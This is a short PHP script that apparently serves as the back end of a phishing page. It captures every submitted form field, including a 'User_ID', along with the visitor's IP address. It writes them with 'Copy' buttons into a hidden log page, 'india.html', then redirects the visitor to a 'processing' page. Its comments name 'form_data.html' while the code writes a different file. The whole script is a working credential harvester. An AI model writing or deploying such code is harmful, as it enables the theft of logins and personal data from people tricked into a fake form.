<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Start a session to store the username temporarily
    session_start();

    // Retrieve the username from the POST request and store in the session
    if (isset($_POST['User_ID'])) {
        $_SESSION['User_ID'] = htmlspecialchars($_POST['User_ID']); // Sanitize the input
    }

    // Get the user's IP address
    $ip_address = htmlspecialchars($_SERVER['REMOTE_ADDR']);

    // Start formatting the data for HTML body content
    $data = "<p><strong>IP Address:</strong> $ip_address</p>\n";

    // Dynamically write each POST variable and its value, with copy functionality
    foreach ($_POST as $variable => $value) {
        // Sanitize input
        $sanitizedValue = htmlspecialchars($value);
        $data .= "<p id='post-$variable'>$variable = <span class='copy-content'>$sanitizedValue</span> 
                  <button class='copy-btn' data-target='post-$variable'>Copy</button></p>\n";
    }

    $data .= "<hr>\n";

    // Check if form_data.html exists and is writable
    $filePath = "india.html";
    if (file_exists($filePath) && is_writable($filePath)) {
        // Read current content of form_data.html
        $currentContent = file_get_contents($filePath);

        // Find the position to insert the new data (right after <body> tag)
        $insertPosition = strpos($currentContent, "<body>") + 6;

        if ($insertPosition !== false) {
            // Insert new data at the calculated position
            $newContent = substr_replace($currentContent, $data, $insertPosition, 0);

            // Write the updated content back to form_data.html
            file_put_contents($filePath, $newContent);

            // Redirect to processing.html after processing
            header("Location: processing.html");
            exit(); // Ensure that no further code is executed after redirection
        } else {
            echo "Error: Could not find <body> tag in form_data.html";
        }
    } else {
        echo "Error: form_data.html is not writable or does not exist.";
    }
} else {
    echo "Access Denied";
}
?>
